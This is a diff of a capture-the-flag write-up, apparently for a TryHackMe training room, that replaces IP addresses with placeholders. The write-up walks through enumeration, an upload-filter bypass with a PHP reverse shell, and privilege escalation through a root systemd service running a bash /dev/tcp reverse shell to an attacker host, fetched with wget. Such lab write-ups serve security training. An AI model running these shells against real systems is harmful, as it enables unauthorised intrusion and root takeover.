@@ -9,7 +9,7 @@ The room is guided, so it's quite easy to complete it. It teaches a lot...
 Enumeration with NMap:
 
 ```sh
-nmap -sV <machines ip>
+nmap -sV <MACHINE_IP>
 ```
 
 There is a web server running on port `3333`.
@@ -17,7 +17,7 @@ There is a web server running on port `3333`.
 Enumerate directories with GoBuster:
 
 ```sh
-gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirb/small.txt
+gobuster dir -u http://<MACHINE_IP>:3333 -w /usr/share/wordlists/dirb/small.txt
 ```
 
 We discover that there is an `/internal/` directory and we visit it. It accepts uploads!
@@ -77,8 +77,8 @@ We discover that the extension `.phtml` is not blocked in the upload page. There
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.10.11';    // CHANGE THIS
-$port = 1234;           // CHANGE THIS
+$ip = '<ATTACK_IP>';    // CHANGE THIS
+$port = <ATTACK_PORT1>;           // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -226,8 +226,8 @@ To gain remote access to this machine, follow these steps:
 
 - Edit the `php-reverse-shell.php` file and edit the IP to be your `tun0` IP (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
 - Rename this file to `php-reverse-shell.phtml`.
-- We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`.
-- Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload!
+- We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp <ATTACK_PORT1>`.
+- Upload your shell and navigate to http://<MACHINE_IP>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload!
   You should see a connection on your netcat session.
 
 We discover that the user on the machine is `bill`. We can get the user flag in `/home/bill`.
@@ -251,7 +251,7 @@ Description=root
 [Service]
 Type=simple
 User=root
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.0.91/9999 0>&1'
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACK_IP/<ATTACK_PORT2> 0>&1'
 
 [Install]
 WantedBy=multi-user.target
@@ -259,10 +259,10 @@ WantedBy=multi-user.target
 
 We serve this file with Python: `python -m http.server 8080` from the same directory containing `root.service`.
 
-We get `root.service` on the attacked machine: in `/var/www/html` (a directory where we can write files) we launch: `wget http://10.10.10.11:8080/root.service`
+We get `root.service` on the attacked machine: in `/var/www/html` (a directory where we can write files) we launch: `wget http://<ATTACK_IP>:8080/root.service`
 Then, we enable the service with `/bin/systemctl enable /var/www/html/root.service`.
 
-On the attacking machine, we start a listener on port `9999` with `nc -lvnp 9999`.
+On the attacking machine, we start a listener on port `<ATTACK_PORT2>` with `nc -lvnp <ATTACK_PORT2>`.
 
 Finally, on the attacked machine, we start the service with:
 ```
